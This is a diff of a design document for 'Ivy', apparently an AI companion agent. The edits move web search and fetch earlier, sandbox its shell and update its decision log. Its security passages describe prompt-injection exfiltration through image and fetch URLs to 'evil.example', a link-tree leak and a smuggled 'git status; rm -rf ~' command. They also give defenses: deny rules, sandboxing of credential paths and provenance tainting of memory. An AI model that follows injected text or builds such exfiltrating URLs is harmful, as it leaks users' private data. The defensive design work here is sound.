@@ -1,6 +1,6 @@
 # Ivy — Design Document
 
-> Status: **Draft v0.1** · M0 and M1 done; M2 built (daemon, reminders, the app and its chat window), its weeks of use now; company (M3) next · Last updated: 2026-10-22
+> Status: **Draft v0.1** · M0 and M1 done; M2 built (daemon, reminders, the app and its chat window), its weeks of use now; company (M3) next · Last updated: 2026-10-23
 > This is a living document. Every milestone starts by updating it and ends by recording what changed in the [Decision Log](#13-decision-log).
 
 **Before changing this document**, check every sentence added against this list.
@@ -117,10 +117,11 @@ The kernel runs in the daemon (`ivy daemon`), which owns sessions and runs the s
 - Speaks the protocol of the `[providers.*]` endpoint of the model in use (§5.2.1). Adaptive thinking where the model has it, and one `effort` level from `[generation]` (switch with `/effort`); the default model is in §10.
 - Server-side refusal fallback (`fallbacks: "default"`) is on where supported (decided by `Capabilities`), as Anthropic recommends: if the model declines, Anthropic re-runs the request on a fallback model within the same call, and a notice names both models, so a swap is never silent.
 - **Compatible endpoints vary.** Effort, adaptive thinking, prompt caching, refusal fallback, `clear_at` system messages, compaction and server tools are Anthropic API features; a compatible endpoint or a non-Claude model may ignore or reject them.
-- **Capabilities** decide per request which optional features a model gets on its provider's endpoint, from three sources:
+- **Capabilities** decide per request which optional features a model gets on its provider's endpoint, from these sources:
   1. **Models API** (Anthropic's own API only; OpenAI's lists models without what they support): `client.models.list()` reports effort support and levels, `max_tokens`, context window, thinking types, server tools and more. Fetched in the background and cached. New models need no code change. It does *not* report mid-conversation system messages or refusal fallback.
   2. **Learned:** when the endpoint answers a request with a 400 naming an optional feature it used, the agent turns that feature off for that model, tells the user with a notice, and resends the step. Images are learned the same way: a model that refuses them gets, from then on, a line saying an image was left out in place of each one (the session keeps them).
-  3. **Defaults:** on the official API, Claude models get the optional features, except a fixed pattern of *older* models known to lack them (this list only covers the past, so it never grows). Other endpoints get the basics plus what they may ignore or refuse (§5.2.1).
+  3. **Probed:** a feature an endpoint could ignore without a trace, which only a vendor's own API is otherwise trusted with (§5.2.1), is tried once per model and endpoint, where nothing else reports it, with a small request, and kept if the reply shows it working. Server-side web search is the one (§8): a proxy in front of a vendor's API may pass it or not, and from a reply without a search an ignored tool can't be told from one the model didn't need.
+  4. **Defaults:** on the official API, Claude models get the optional features, except a fixed pattern of *older* models known to lack them (this list only covers the past, so it never grows). Other endpoints get the basics plus what they may ignore or refuse (§5.2.1).
 - An official endpoint is recognised by `base_url` (`api.anthropic.com`, `api.openai.com`), not by `type`: `type` names the protocol, which official and compatible endpoints share.
 - **Prompt caching:** tools and system prompt are kept byte-stable (plugins sorted by id, no timestamps), with a cache breakpoint after them. Volatile context (the time, todos due today) goes with the new user message, as a `clear_at` system message or a `<context>` block (§5.3), never into the system prompt, so the cached prefix stays intact.
 - **Helper model (planned, with the first side task):** side work (summaries, background memory review, a pending-entry checker) runs on an optional `[agent] helper_model`, named like the main model (`provider/model`, on any provider); unset, it is the main model at `low` effort, which is the first thing to measure (one model also keeps one prompt cache).
@@ -135,7 +136,7 @@ The kernel runs in the daemon (`ivy daemon`), which owns sessions and runs the s
 `type = "anthropic"` speaks the Messages API, `type = "openai"` Chat Completions: between them nearly every model is reachable, on its vendor's API, a proxy or a local server.
 
 - **Ivy's own format is Anthropic's**, in memory and in session files: the richest of the common ones (text, images, tool calls and results, thinking as blocks). The `openai` client translates at its edge, both ways, so the agent loop, sessions and traces stay as they are.
-- **`type` says the protocol, `base_url` only what is the vendor's alone.** An optional feature an endpoint can ignore harmlessly, or refuse with a 400, is sent to every endpoint and dropped for a model on a 400 (§5.2), so a vendor that copies Anthropic's or OpenAI's extensions gets them. What would be lost silently if ignored (`clear_at` system messages: the turn's context would vanish unseen), or belongs to one vendor (refusal fallback, Models API facts), goes to its own API alone, told by `base_url` (`api.anthropic.com`, `api.openai.com`). A proxy in front of a vendor's own API is treated as any other endpoint for these, a simple rule taken over a per-provider switch.
+- **`type` says the protocol, `base_url` only what is the vendor's alone.** An optional feature an endpoint can ignore harmlessly, or refuse with a 400, is sent to every endpoint and dropped for a model on a 400 (§5.2), so a vendor that copies Anthropic's or OpenAI's extensions gets them. What would be lost silently if ignored (`clear_at` system messages: the turn's context would vanish unseen), or belongs to one vendor (refusal fallback, Models API facts), goes to its own API alone, told by `base_url` (`api.anthropic.com`, `api.openai.com`). A proxy in front of a vendor's own API is treated as any other endpoint for these, a simple rule taken over a per-provider switch. The one exception is a feature that can be probed once and seen to work (§5.2, source 3), as server-side search can be.
 - **OpenAI's Responses API, later, is a third `type`**: a protocol of its own, which carries a reasoning model's reasoning across tool calls; any endpoint that speaks it can use it.
 - **Switching models mid-session:** each reply records where it came from, the endpoint's `base_url` and the model, and its thinking (Anthropic's signed blocks, the reasoning text a Chat Completions endpoint sent) goes back only to that model at that endpoint. Elsewhere it is dropped: another backend may reject what it can't verify, even behind one proxy, and what matters stays in the reply's text. It costs nothing, as a model's thinking is needed only within its own turn and `/model` applies from the next one. Told by the endpoint, not the provider's name, which may be pointed elsewhere.
 - **Usage is counted as Anthropic counts it** (input without the cached tokens, cache reads apart), so tokens and cache hits read the same on either protocol.
@@ -203,9 +204,9 @@ Every tool declares a **risk level**:
 | `read` | search memory, read a file, list emails | allow |
 | `write` | save a note, edit a local file, create a draft | ask (allowable by rule or *Always*) |
 | `external` | send an email, post a message, accept an invite | ask (allowable by rule or *Always*) |
-| `dangerous` | shell commands, deleting data, a change to `SOUL.md` | always ask (Yes/No only, no rule allows it), show full input |
+| `dangerous` | a command outside the sandbox (§8.3), deleting data, a change to `SOUL.md` | always ask (Yes/No only, no rule allows it), show full input |
 
-Rules are tool-name globs (`*` matches anything). No rules on arguments ("allow `git status*`"): they are easy to slip past (`git status; rm -rf ~`); commands are asked every time in M5 and bounded by a sandbox from M6 (§8.3).
+Rules are tool-name globs (`*` matches anything). No rules on arguments ("allow `git status*`"): they are easy to slip past (`git status; rm -rf ~`); commands are bounded by a sandbox (§8.3).
 
 ```toml
 [permissions]
@@ -225,8 +226,8 @@ deny  = ["shell__*"]
 - A prompt no one answers is refused after a while, and the model is told no one answered rather than that the user said no.
 - **Permission modes:** how an "ask" is resolved, which is why the four risk levels stay distinct.
   - **Ask** (the default): as above.
-  - **Auto** (M5, chosen by the user in the settings): a classifier model (the helper model, §5.2) decides whether a `write` or `external` call is one the user asked for, and asks when it can't tell or fails. It sees only what the user wrote and the call, never tool results or other outside content, so text injected there has no say in it. The choice is the user's (§13). It is a convenience, not a boundary: `deny` and `ask` rules hold, `dangerous` tools are still asked (a command in the sandbox, from M6, may run, its worst bounded, §8.3), and a call it let through shows as such in the transcript.
-  - **Unattended** (M3 jobs): writes run, external actions wait for the user, dangerous ones are denied.
+  - **Auto** (M5, chosen by the user in the settings): a classifier model (the helper model, §5.2) decides whether a `write` or `external` call is one the user asked for, and asks when it can't tell or fails. It sees only what the user wrote and the call, never tool results or other outside content, so text injected there has no say in it. The choice is the user's (§13). It is a convenience, not a boundary: `deny` and `ask` rules hold, `dangerous` tools are still asked (a command in the sandbox may run, its worst bounded, §8.3), and a call it let through shows as such in the transcript.
+  - **Unattended** (M3 jobs): writes run, external actions wait for the user, dangerous ones and the shell are denied.
 
 ### 5.6 Plugin Host
 
@@ -356,7 +357,7 @@ A plugin is a folder with an `index.ts` that default-exports an `IvyPlugin`. The
 - **What the window loads can leak too, without a tool.** Text hidden in an email can tell the model to put what it knows into an image's URL (`![](https://evil.example/x.png?d=…)`); a page that loads a reply's images sends it with no one seeing, past every permission prompt. Reported against ChatGPT, Claude.ai and Copilot. So a reply's images wait for a click (§5.7). It is not a full defense: a click made without reading the site still sends the URL, and so does opening a link, which carries the same risk. What would do more, and why not now:
   - **Only URLs already in the conversation load** (ChatGPT's way): a URL the model builds can't be among them, as the data wasn't known when they were written. It needs every tool marked for whether its results are outside content: what Ivy wrote and read back (memory, a file) must not count, or a URL saved by a tool and read back passes. And it still leaks a little: an injection can list a URL per letter and have the model pick, so a cap on how many load is needed too.
   - **A model judging each URL** would read the same injected text as the one it checks, and is right only most of the time; the boundary has to be a rule, not a judgment. (Auto mode's classifier, §5.5, is a convenience the user chooses on top of the rules, and reads none of that text.)
-- **`fetch` (M6) is the same channel, with no click at all**: a request to `evil.example/?d=…` carries the data off. So it fetches unasked only a URL the user wrote or a search returned, which can't hold what the model read since; any other is asked about, the whole URL shown, links in a page it fetched included: a page is the attacker's to write, and a tree of links on it, followed one pick at a time, spells out the data (found in Anthropic's server-side `web_fetch` in 2026, which let them through). A cap on fetches per turn bounds what a run of picks the user allows can carry. Its results are outside content (§8.1).
+- **`fetch` (M3) is the same channel, with no click at all**: a request to `evil.example/?d=…` carries the data off. So it fetches unasked only a URL the user wrote or a search returned, which can't hold what the model read since; any other is asked about, the whole URL shown, links in a page it fetched included: a page is the attacker's to write, and a tree of links on it, followed one pick at a time, spells out the data (found in Anthropic's server-side `web_fetch` in 2026, which let them through). A cap on fetches per turn bounds what a run of picks the user allows can carry. Its results are outside content (§8.1).
 
 ### 6.4 Reusing other ecosystems
 
@@ -407,11 +408,11 @@ The data root is `$IVY_HOME`, default `~/.ivy`, which the terminal and the app s
 | `journal` | M1 | `IVY.md`, Ivy's own first-person journal of what it lived with the user, in every session; proposals for `SOUL.md`; `/journal` to read it; off with `enabled = false` (§8.1) | `write`, `revise`, `propose_soul_edit` |
 | `reflection` | M3 | The user's days and moods as daily notes, and weekly and monthly reviews built from them, in Ivy's words, from what the user shared; run as jobs, kept as files (§11, M3) | job `daily`, job `weekly`, job `monthly` |
 | `fs` | M5 | Read, write and edit files in allowed directories (§8.3); with `shell`, the basics a conversation needs, on any model | `read`, `write`, `edit`, `glob`, `grep` |
-| `shell` | M5 | Run commands: asked every time in M5, sandboxed from M6 (§8.3) | `run` |
+| `shell` | M5 | Run commands, in a sandbox (§8.3) | `run` |
 | `coding-agent` | M5 | Coding and work tasks handed to any coding CLI that speaks the Agent Client Protocol, run as a subagent (principle 8). The agent's own permission requests go through Ivy's gate. Without one installed, Ivy's `fs` and `shell` still do the basics on any model (principle 7) | `run` |
 | `mcp` bridge | M5 | Wraps configured MCP servers as plugins | (from servers) |
 | mail / calendar | M6 | Not plugins of Ivy's: their MCP servers through the bridge, and skills for how this user triages, replies and plans (principle 8) | (from servers) |
-| `web` | M6 | Web search: the model's own server-side search where its vendor's API is known to have it (told by `base_url`: one silently ignored would leave the model searching nothing), else a search API. Fetch always Ivy's own, as a server-side one skips the permission gate; which URLs it fetches unasked is in §6.3 | `search`, `fetch` |
+| `web` | M3 | Web search: the model's own server-side search where its vendor's API has it, or a probe found the endpoint passing it (§5.2); elsewhere a search API of Ivy's, not built until a model without server-side search is used (a deliberate gap in principle 7: until then such a model is told it can't search, and never implies it did). Fetch always Ivy's own, as a server-side one skips the permission gate; which URLs it fetches unasked is in §6.3 | `search`, `fetch` |
 | morning brief | M6 | A skill run by a job (M3): calendar, mail, todos and feeds | (a skill) |
 
 ### 8.1 Memory plugin
@@ -526,7 +527,7 @@ Used by `memory__search`, `/memory <query>` and `session_search`. Pure functions
 - The hot files are labeled in the system prompt as saved by Ivy: `USER.md` as the user's preferences (followed unless `SOUL.md` or `rules.md` say otherwise), `MEMORY.md` as reference data, not instructions.
 - Never silently drop: over-cap writes fail, done todos go to the archive, nothing expires.
 - `delete` asks by default; users can add `ask = ["memory__*"]` to review every write.
-- **Outside content (M6):** once a session has read mail, web pages or other outside content (it is *tainted*), nothing it writes reaches the always-injected files without the user: writes to `USER.md` wait for approval, other writes go to the archive marked `ext`, and archive hits marked `ext` taint the session that finds them. Scheduled jobs (M3) follow the same rules. Only the user can vouch for an `ext` entry (by deleting the mark); a model could be talked into it. This rests on where text came from, not on recognizing it: a content check by a model would have to read the attacker's text and could be persuaded by it. A checker model that reads only the user's own words may help sort pending entries later.
+- **Outside content (M3):** once a session has read mail, web pages, search results or other outside content (it is *tainted*; a vendor's server-side search counts, told from the reply's own search blocks, as it never passes through Ivy's tool loop), nothing it writes reaches the always-injected files without the user: writes to `USER.md` wait for approval, other writes go to the archive marked `ext`, and archive hits marked `ext` taint the session that finds them. Scheduled jobs follow the same rules. Only the user can vouch for an `ext` entry (by deleting the mark); a model could be talked into it. This rests on where text came from, not on recognizing it: a content check by a model would have to read the attacker's text and could be persuaded by it. A checker model that reads only the user's own words may help sort pending entries later.
 
 #### Commands
 
@@ -581,18 +582,16 @@ A skill is *know-how* rather than a tool: how this user writes the weekly report
 
 Two plugins, so each can be turned off and given rules on its own (`deny = ["shell__*"]`), and a harmless `core` stays harmless. `fs` works in allowed directories (`[plugins.fs] dirs`).
 
-**Shell in M5: asked every time.** `run` is `dangerous`: each command is shown in full and asked about; nothing else is needed while Ivy only acts on what the user asks directly.
-
-**Shell from M6: sandboxed, so it needn't ask.** Once Ivy reads mail and web pages, an injected instruction can reach the shell (jobs never do: the unattended mode denies `dangerous` tools, §5.5), and asking alone protects little. A command's name says little about what it does (`npm test` runs whatever `package.json` says), and many prompts turn approval into reflex. A sandbox limits what any command can touch instead: writes only inside the allowed directories, no reads of secrets (`~/.ssh`, cloud credentials, `~/.ivy` with its API key and memory), and no network except approved domains, which is what stops data from leaving. Inside those limits commands run without asking (Claude Code reports far fewer prompts the same way).
+**Shell: sandboxed from when it arrives (M5), so it needn't ask.** Ivy reads web pages from M3, before the shell arrives, so an injected instruction can reach the shell (jobs never do: the unattended mode denies the shell and other `dangerous` tools, §5.5), and asking alone protects little. A command's name says little about what it does (`npm test` runs whatever `package.json` says), and many prompts turn approval into reflex. A sandbox limits what any command can touch instead: writes only inside the allowed directories, no reads of secrets (`~/.ssh`, cloud credentials, `~/.ivy` with its API key and memory), and no network except approved domains, which is what stops data from leaving. Inside those limits commands run without asking (Claude Code reports far fewer prompts the same way).
 - **Reuse, don't build:** Anthropic's `sandbox-runtime` (the library behind Claude Code's sandbox; Seatbelt on macOS, bubblewrap and seccomp on Linux, a proxy for network rules, reports of what was blocked). Fallback: a small hand-written macOS profile with the network off.
 - **Network:** no domains by default; a command reaching a new one goes through the Permission Gate, where *Always* allows that domain.
 - **Escalation (as in Codex):** when the sandbox blocks something, the model may ask to run it outside, with a justification; that run is `dangerous`, asked every time, never automatic.
 
 **Edit tool: string replacement, forgiving only where it can't go wrong.** Replacement beat patch formats for nearly every model in published comparisons, most for weaker ones. Matching normalizes only what can't change meaning; no fuzzy matching, as an error is better than a wrong edit. A file must be read before it is edited.
 
-**Defaults:** reads run; writes and edits ask, showing the diff (*Always* available); commands as above.
+**Defaults:** reads run; writes and edits ask, showing the diff (*Always* available). Inside the sandbox `run` is a `write` tool allowed by default (`defaultAllow`, as the sandbox bounds it); escalation outside it is `dangerous`.
 
-**Two guards from OpenCode:** `fs` refuses secret files even inside allowed directories (`.env`, keys, credentials), from M5, before the sandbox does it for commands; and the agent loop's guard against a model repeating the same call (§5.1), where `max_steps` alone only stops it late.
+**Two guards from OpenCode:** `fs` refuses secret files even inside allowed directories (`.env`, keys, credentials), as the sandbox does for commands; and the agent loop's guard against a model repeating the same call (§5.1), where `max_steps` alone only stops it late.
 
 ## 9. Project Layout
 
@@ -680,11 +679,12 @@ Goal: Ivy is someone the user wants to keep talking to (G1, G8): more like a per
 - **Memory that serves the conversation**, complete and accurate before cheap (§8.1):
   - Kept: what the user shares of their life, the archive taking what doubt would once have dropped; the hot files' limits set by the evals below (§8.1).
   - Kept in order: the archive in topic files (family, health, a friend, work), each with a line on when it matters, their list always in front of the model and a topic read whole when needed, as skills and Claude Code's memory do: the model knows what it knows about the user, and finds it without guessing keywords.
-  - Kept even when missed: the evening job that writes the day's note also saves what the user said that day that should have been kept and wasn't, as claude.ai's memory is drawn from past chats; only what was said, never what the job infers.
+  - Kept even when missed: the evening job that writes the day's note also saves what the user said that day that should have been kept and wasn't, as claude.ai's memory is drawn from past chats; only what was said, never what the job infers. It reads the user's own words, not tool results or outside content, so what it keeps is untainted (§8.1), even from a conversation where Ivy searched.
   - Recalled without the model having to think of it: each turn, what the user just said is searched for in memory, past conversations and the daily notes, and the best hits go into that turn's context; the last days' notes and the last conversation's key points come with every conversation.
   - Used lightly, when it matters (the cat's name, a shared joke), not recited; how the user wants to be met when low held to.
 - **A sense of time and of going on:** each turn's context says how long since the last conversation, and what was left open there (from the session key points below), so after days apart Ivy notices it and picks up the thread; late night, weekends and holidays change how she talks.
 - **A life of her own:** a job has Ivy look back over recent conversations and write in her journal what she made of them (§8.1, real, not performed), which she may bring up herself next time.
+- **Knowing what the user is talking about:** a new show, the news, a meme: she looks up what may have changed since her model's training, or what she doesn't know, rather than guessing or giving up; not while the user is pouring something out. The `web` plugin (§8; fetch rules, §6.3). What it brings is outside content, kept out of standing memory (§8.1); what the user says in such a conversation is still kept, by the evening pass (above).
 - **Never pretending:** asked, Ivy says she is an AI, a someone with a character, not a human; no faked typing or delays (statuses are real); no experiences she didn't have, hers being what she lived with the user.
 - **Tuned by evals, not by feel:** recall cases (something said once, weeks ago, asked about in other words), "reads like a person" cases, and the existing memory and journal sets. What a pattern can tell (Markdown, one question, an assistant's opener, the user's language) is checked in code; the rest by a judge model that sees what Ivy knew (her prompt, the turn's context, her tools' results), so recalling well isn't taken for inventing. Cases cut from the user's own conversations are kept in `~/.ivy/evals/`, never in the repository. They set the limits, how much each turn recalls, whether meaning-based search earns its place, and the rules and prompts; every change and every model is compared on them. What real use catches becomes a case.
 - **Around it, the reasons to come back.** Jobs: the daemon's scheduler runs Ivy as a fresh agent under the unattended mode (§5.5, §5.7), silent when there is nothing to say.
@@ -704,7 +704,7 @@ Goal: one Ivy for the user, wherever they are: the home Mac, the office Mac, the
 
 ### M5 — Work, by reuse
 Goal: work gets done through the agents and tools built for it (principle 8), with Ivy's own tools the basics a conversation needs.
-- Coding CLIs as delegates over ACP (`coding-agent`), the MCP bridge and skills first; `fs` and `shell` (§8.3) kept basic; the shell asks before every command.
+- Coding CLIs as delegates over ACP (`coding-agent`), the MCP bridge and skills first; `fs` and `shell` (§8.3) kept basic, the shell sandboxed.
 - The Auto permission mode, for those who choose it (§5.5).
 - MCP tools exposed on demand, not all up front.
 - Background tasks, subagents and steering (§5.9).
@@ -715,10 +715,9 @@ Goal: work gets done through the agents and tools built for it (principle 8), wi
 
 ### M6 — Daily life, by reuse
 Goal: help with mail, calendar and the day's brief, built from MCP servers and skills rather than plugins of Ivy's (principle 8).
-- Prerequisites: "unknown outcome" for interrupted side effects (§5.4); outside content kept out of standing memory (§8.1); the sandboxed shell (§8.3).
+- Prerequisites: "unknown outcome" for interrupted side effects (§5.4).
 - Mail and calendar through their MCP servers (the bridge, M5), with skills for how this user triages and replies: inbox triage, draft replies (never auto-send), today's agenda.
 - The morning brief as a skill run by a job (M3): calendar, mail, todos and feeds.
-- The `web` plugin, Ivy's own as its rules need the permission gate (§6.3).
 - *(To decide when triage is built)* **Code mode** ([Cloudflare](https://blog.cloudflare.com/code-mode/)): the enabled tools also as a typed API, and one tool that runs a script against it, so a loop over fifty emails runs in code and the model reads only the result. If adopted: sandboxed, no network, every call through the kernel and the permission gate, the single tools staying; evals decide.
 - **Done when:** a useful brief is waiting every weekday morning, and inbox triage happens in Ivy.
 
@@ -734,7 +733,8 @@ Goal: help with mail, calendar and the day's brief, built from MCP servers and s
 ## 12. Open Questions
 
 1. **Notifications:** macOS from M2; also to the phone? → decide with the gateway (M4).
-2. **Mail and calendar servers:** which MCP servers, and how they keep the daemon signed in (OAuth, offline access)? → decide in M6.
+2. **Search API for the fallback:** which one, for models without server-side search (§8)? → decide when first needed.
+3. **Mail and calendar servers:** which MCP servers, and how they keep the daemon signed in (OAuth, offline access)? → decide in M6.
 
 ## 13. Decision Log
 
@@ -758,7 +758,7 @@ Real forks in the road only; the sections hold the details. Superseded decisions
 | 2026-10-18 | Memory safety rests on provenance; a regex scan is the backstop | A model checking the attacker's text can be talked round |
 | 2026-10-18 | *For this session* / *Always* offered only where they take effect | Remembering an answer an `ask` rule overrides did nothing |
 | 2026-10-18 | What this document records, and what it leaves to the code and git: the list at its top | Untested designs go stale; a doc that logs every change reads as a diary |
-| 2026-10-18 | Shell asked every time in M5, sandboxed from M6 with escalation asked; edits by string replacement | Once outside content reaches Ivy, asking protects little and a sandbox bounds any command; replacement is the most robust edit form across models |
+| 2026-10-18 | Shell sandboxed from the start, escalation asked; edits by string replacement | Outside content reaches Ivy before the shell does, asking protects little, and a sandbox bounds any command; replacement is the most robust edit form across models |
 | 2026-10-19 | Changes to memory during a session reach the model as added and removed lines in the turn's context | The cache holds and the model still sees current memory |
 | 2026-10-19 | A model is named `provider/model` everywhere | Every place that picks a model names it the same way, on any provider |
 | 2026-10-19 | `IVY.md`, Ivy's own journal, in a `journal` plugin; Ivy may criticize or refuse but never acts against the user, and may only propose edits to `SOUL.md` | Ivy should be someone, and its continuity can only live in text it writes; the user keeps control of their machine |
@@ -775,8 +775,9 @@ Real forks in the road only; the sections hold the details. Superseded decisions
 | 2026-10-21 | A settings page in the window; providers edited there in place; API keys in the macOS Keychain, `config.toml` still read | The app should be usable without a text editor; a key in a plain file leaks with backups and screen shares; edits in place keep the file the user's |
 | 2026-10-21 | OpenAI's Chat Completions beside the Messages API; Ivy's format stays Anthropic's, translated at the edge; `type` says the protocol, `base_url` only what is a vendor's alone (§5.2.1) | Between the two nearly every model is reachable; sessions and the loop stay as they are, where a multi-provider library would replace them |
 | 2026-10-21 | Images from the user: uploaded as files when attached, then beside their session, named by hash and kept with it; sent whole, shrunk by the page only past the APIs' limits; a model that refuses them learned like an optional feature | A session file stays readable; the pictures last as long as the conversation; no second model and no retry loop to keep |
-| 2026-10-21 | A reply's images load on a click, as on Claude.ai, not unseen, not never (Gemini), not by an allow-list of URLs seen in the conversation (ChatGPT) | Nothing leaks unseen, at one click; an allow-list needs every tool marked for whether it brings outside content, and no tool brings any yet (§6.3) |
+| 2026-10-21 | A reply's images load on a click, as on Claude.ai, not unseen, not never (Gemini), not by an allow-list of URLs seen in the conversation (ChatGPT) | Nothing leaks unseen, at one click; an allow-list needs every tool marked for whether it brings outside content (§6.3) |
 | 2026-10-21 | An Auto permission mode, the user's choice: a classifier that sees only what the user wrote decides what they asked for; Ask stays the default | Models resist injection better each year, and many would trade some safety for not being asked; keeping tool results from the classifier keeps injected text out of the decision, and the rules and the sandbox remain the boundary |
 | 2026-10-22 | Ivy is a companion to confide in, who keeps a record of the user's days and moods and looks back on it with them; daily life and work help second, through existing agents, MCP servers and skills (ACP for work; mail, calendar and the brief as MCP and skills), Ivy building only the basics; company (M3: memory, replies, what brings the user back) before work (M5) | However far Ivy's work tools went, products built for work would do it better; a companion that remembers, on the user's own files and any model, is what they don't offer |
 | 2026-10-23 | Development apart from the user's Ivy: `~/.ivy-dev`, its own daemon, Keychain entries, app ("Ivy Dev") and command; only a release build uses `~/.ivy` | Both live on one Mac, and a daemon from other code replaces the running one: without this, running Ivy from source wrote to the user's conversations |
 | 2026-10-23 | One daemon per user, reached from every machine and channel (M4), not a synced data folder; a chat-app gateway as one more client, its privacy trade-off stated | A synced folder means two daemons writing the same files and reminders twice; the gateway reaches the phone with no network setup, but through the chat app's servers |
+| 2026-10-23 | Web search and fetch, with outside content kept out of standing memory, in M3; the model's own server-side search first (probed once on a proxy), Ivy's search API when a model without one is used | A companion has to know what the user is talking about beyond its model's training, which waiting for M6 left out of the milestone about company; protection has to come with the first outside content, and the evening pass keeps what the user said in a searched conversation |
